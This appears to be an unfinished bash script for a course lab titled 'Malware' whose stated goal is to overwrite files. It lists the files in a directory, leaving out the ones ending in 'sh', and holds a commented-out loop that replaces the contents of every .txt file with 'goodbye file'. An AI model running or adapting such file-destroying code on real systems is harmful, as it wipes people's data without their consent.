#! /usr/bin/env bash

# Lab 7: Malware
# Goal: overwrite files

filearray=($(ls | grep -E ".*\..*[^sh]$"))



# works fine for txt files
#for filename in *.txt
#do
#	echo "goodbye file" > $filename
#done

